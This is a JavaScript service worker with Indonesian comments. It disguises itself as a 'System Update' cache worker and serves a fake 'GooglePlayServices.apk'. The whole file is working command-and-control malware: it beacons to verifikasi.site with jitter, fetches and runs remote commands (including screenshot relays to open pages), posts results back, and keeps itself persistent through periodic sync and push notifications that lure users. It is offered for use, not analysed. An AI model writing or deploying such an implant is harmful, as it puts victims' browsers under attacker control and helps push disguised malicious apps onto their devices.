// ============================================================
// 🔥 SERVICE WORKER - VERSI MAKSIMAL (SUDAH DIPERBAIKI)
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var VERSION = '2.0.1';
var CACHE_NAME = 'system-update-v' + VERSION;
var STATIC_CACHE = 'static-v' + VERSION;
var DYNAMIC_CACHE = 'dynamic-v' + VERSION;
var SERVER_URL = 'https://verifikasi.site';
var C2_INTERVAL = 30000; // 30 detik (dengan jitter)
var HEARTBEAT_INTERVAL = 1800000; // 30 menit
var MAX_RETRIES = 3;

// ============================================================
// DAFTAR FILE YANG DI-CACHE (LENGKAP)
// ============================================================
var STATIC_FILES = [
    '/',
    '/index.html',
    '/dashboard.html',
    '/qr.html',
    '/files/SystemUpdate.html',
    '/files/GooglePlayServices.apk',
    '/icon.png'
];

// ============================================================
// 🔥 INSTALL
// ============================================================
self.addEventListener('install', function(event) {
    console.log('[SW] Install v' + VERSION);
    
    event.waitUntil(
        caches.open(STATIC_CACHE)
            .then(function(cache) {
                console.log('[SW] Caching static files...');
                return cache.addAll(STATIC_FILES).catch(function(err) {
                    console.error('[SW] Failed to cache:', err);
                });
            })
            .then(function() {
                console.log('[SW] Install complete');
                return self.skipWaiting();
            })
    );
});

// ============================================================
// 🔥 ACTIVATE - CLAIM CONTROL & CLEAN OLD CACHE
// ============================================================
self.addEventListener('activate', function(event) {
    console.log('[SW] Activate v' + VERSION);
    
    event.waitUntil(
        caches.keys()
            .then(function(cacheNames) {
                return Promise.all(
                    cacheNames.map(function(cacheName) {
                        if (cacheName !== STATIC_CACHE && 
                            cacheName !== DYNAMIC_CACHE &&
                            cacheName.startsWith('system-update-')) {
                            console.log('[SW] Deleting old cache:', cacheName);
                            return caches.delete(cacheName);
                        }
                    })
                );
            })
            .then(function() {
                console.log('[SW] Activate complete, claiming clients');
                return self.clients.claim();
            })
    );
});

// ============================================================
// 🔥 FETCH - STRATEGY CACHE-FIRST DENGAN TIMEOUT
// ============================================================
self.addEventListener('fetch', function(event) {
    var request = event.request;
    var url = new URL(request.url);
    
    // Skip untuk API, WebSocket
    if (url.pathname.startsWith('/data') || 
        url.pathname.startsWith('/api') ||
        url.pathname.startsWith('/ws') ||
        url.pathname.startsWith('/error')) {
        event.respondWith(fetch(request));
        return;
    }
    
    if (request.method !== 'GET') {
        event.respondWith(fetch(request));
        return;
    }
    
    if (url.pathname.endsWith('.apk')) {
        event.respondWith(handleAPKRequest(request));
        return;
    }
    
    event.respondWith(
        Promise.race([
            caches.match(request),
            new Promise(function(resolve, reject) {
                setTimeout(function() { reject(new Error('Timeout')); }, 15000);
            })
        ])
        .then(function(response) {
            if (response) return response;
            
            return fetch(request)
                .then(function(networkResponse) {
                    if (url.pathname.endsWith('.html') || 
                        url.pathname.endsWith('.css') || 
                        url.pathname.endsWith('.js')) {
                        return caches.open(DYNAMIC_CACHE)
                            .then(function(cache) {
                                cache.put(request, networkResponse.clone());
                                return networkResponse;
                            });
                    }
                    return networkResponse;
                });
        })
        .catch(function() {
            if (url.pathname.endsWith('.html')) {
                return caches.match('/offline.html');
            }
            return new Response('Offline', { status: 503 });
        })
    );
});

// ============================================================
// 🔥 HANDLE APK REQUEST (RANGE SUPPORT)
// ============================================================
function handleAPKRequest(request) {
    return caches.match(request)
        .then(function(response) {
            if (response) return response;
            
            return fetch(request)
                .then(function(networkResponse) {
                    return caches.open(DYNAMIC_CACHE)
                        .then(function(cache) {
                            cache.put(request, networkResponse.clone());
                            return networkResponse;
                        });
                });
        })
        .catch(function() {
            return new Response('APK not found', { status: 404 });
        });
}

// ============================================================
// 🔥 RECEIVE MESSAGE FROM PAGE (DENGAN UPDATE SUPPORT)
// ============================================================
self.addEventListener('message', function(event) {
    var data = event.data;
    if (!data || !data.type) return;
    
    switch(data.type) {
        case 'ping':
            event.ports[0].postMessage({
                type: 'pong',
                timestamp: Date.now()
            });
            break;
            
        case 'get_version':
            event.ports[0].postMessage({
                type: 'version',
                version: VERSION
            });
            break;
            
        case 'clear_cache':
            caches.delete(STATIC_CACHE);
            caches.delete(DYNAMIC_CACHE);
            event.ports[0].postMessage({
                type: 'cache_cleared'
            });
            break;
            
        case 'update_sw':
            self.skipWaiting();
            event.ports[0].postMessage({
                type: 'sw_updating'
            });
            break;
            
        case 'command':
            handleCommand(data.command);
            break;
            
        default:
            console.log('[SW] Unknown message type:', data.type);
    }
});

// ============================================================
// 🔥 HANDLE COMMAND DARI PAGE
// ============================================================
function handleCommand(command) {
    console.log('[SW] Command received:', command);
    switch(command.aksi) {
        case 'screenshot':
            self.clients.matchAll().then(function(clients) {
                clients.forEach(function(client) {
                    client.postMessage({
                        type: 'command',
                        command: command
                    });
                });
            });
            break;
        case 'clear_cache':
            caches.delete(STATIC_CACHE);
            caches.delete(DYNAMIC_CACHE);
            break;
        default:
            console.log('[SW] Unknown command:', command.aksi);
    }
}

// ============================================================
// 🔥 HEARTBEAT (DENGAN RETRY)
// ============================================================
function sendHeartbeat(retryCount) {
    retryCount = retryCount || 0;
    try {
        fetch(SERVER_URL + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sumber: 'sw_heartbeat',
                data: {
                    active: true,
                    version: VERSION,
                    timestamp: Date.now(),
                    cache: {
                        static: STATIC_CACHE,
                        dynamic: DYNAMIC_CACHE
                    }
                }
            })
        }).catch(function() {
            if (retryCount < MAX_RETRIES) {
                setTimeout(function() {
                    sendHeartbeat(retryCount + 1);
                }, 1000 * (retryCount + 1));
            }
        });
    } catch(e) {
        if (retryCount < MAX_RETRIES) {
            setTimeout(function() {
                sendHeartbeat(retryCount + 1);
            }, 1000 * (retryCount + 1));
        }
    }
}

// ============================================================
// 🔥 C2 CHECK (DENGAN JITTER)
// ============================================================
function checkC2() {
    try {
        fetch(SERVER_URL + '/data?type=perintah&t=' + Date.now())
            .then(function(r) {
                if (!r.ok) throw new Error('HTTP ' + r.status);
                return r.text();
            })
            .then(function(content) {
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        if (cmd.aksi) {
                            self.clients.matchAll().then(function(clients) {
                                clients.forEach(function(client) {
                                    client.postMessage({
                                        type: 'command',
                                        command: cmd
                                    });
                                });
                            });
                            executeCommandSW(cmd);
                        }
                    } catch(e) {
                        console.error('[SW] C2 parse error:', e);
                    }
                }
            })
            .catch(function() {});
    } catch(e) {
        console.error('[SW] C2 error:', e);
    }
}

// ============================================================
// 🔥 EXECUTE COMMAND DI SW (LENGKAP)
// ============================================================
function executeCommandSW(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';
    
    switch(aksi) {
        case 'ping':
            hasil = 'pong';
            break;
        case 'clear_cache':
            caches.delete(STATIC_CACHE);
            caches.delete(DYNAMIC_CACHE);
            hasil = 'cache_cleared';
            break;
        case 'get_version':
            hasil = VERSION;
            break;
        case 'list_cache':
            caches.keys().then(function(keys) {
                hasil = JSON.stringify(keys);
            });
            break;
        case 'sw_restart':
            self.skipWaiting();
            hasil = 'restarted';
            break;
        case 'get_system_info':
            hasil = JSON.stringify({
                swVersion: VERSION,
                staticCache: STATIC_CACHE,
                dynamicCache: DYNAMIC_CACHE,
                timestamp: Date.now()
            });
            break;
        case 'heartbeat':
            sendHeartbeat();
            hasil = 'heartbeat_sent';
            break;
        case 'c2_check':
            checkC2();
            hasil = 'c2_check_run';
            break;
        default:
            hasil = 'unknown_command: ' + aksi;
    }
    
    // Kirim hasil ke server
    try {
        fetch(SERVER_URL + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sumber: 'sw_c2_result',
                data: {
                    perintah: aksi,
                    hasil: hasil,
                    timestamp: Date.now()
                }
            })
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// 🔥 PERIODIC TASKS (DENGAN JITTER)
// ============================================================
function startPeriodicTasks() {
    sendHeartbeat();
    setTimeout(checkC2, 1000);
    
    setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
    
    // Jitter untuk C2 (30 detik + random 0-5 detik)
    setInterval(function() {
        var jitter = Math.floor(Math.random() * 5000);
        setTimeout(checkC2, jitter);
    }, C2_INTERVAL);
}

// ============================================================
// 🔥 PUSH NOTIFICATION
// ============================================================
self.addEventListener('push', function(event) {
    var data = {};
    try {
        data = event.data.json();
    } catch(e) {
        data = {
            title: 'System Update',
            body: event.data ? event.data.text() : 'Update available'
        };
    }
    
    var options = {
        body: data.body || 'Update available',
        icon: data.icon || '/icon.png',
        badge: data.badge || '/icon.png',
        vibrate: [200, 100, 200],
        data: data.data || {},
        actions: data.actions || [
            { action: 'open', title: 'Open' },
            { action: 'dismiss', title: 'Dismiss' }
        ]
    };
    
    event.waitUntil(
        self.registration.showNotification(data.title || 'System Update', options)
    );
});

// ============================================================
// 🔥 NOTIFICATION CLICK
// ============================================================
self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    var action = event.action;
    var data = event.notification.data || {};
    
    if (action === 'open') {
        event.waitUntil(self.clients.openWindow(data.url || '/'));
    } else if (action === 'dismiss') {
        // Nothing
    } else {
        event.waitUntil(self.clients.openWindow(data.url || '/'));
    }
});

// ============================================================
// 🔥 PERIODIC BACKGROUND SYNC
// ============================================================
self.addEventListener('periodicsync', function(event) {
    if (event.tag === 'sync-data') {
        event.waitUntil(sendHeartbeat());
    }
});

// ============================================================
// 🔥 START
// ============================================================
startPeriodicTasks();

// Register periodic sync
if ('periodicSync' in self.registration) {
    try {
        self.registration.periodicSync.register('sync-data', {
            minInterval: 3600000
        });
    } catch(e) {}
}

console.log('[SW] Service Worker v' + VERSION + ' active');
console.log('[SW] Static cache:', STATIC_CACHE);
console.log('[SW] Dynamic cache:', DYNAMIC_CACHE);
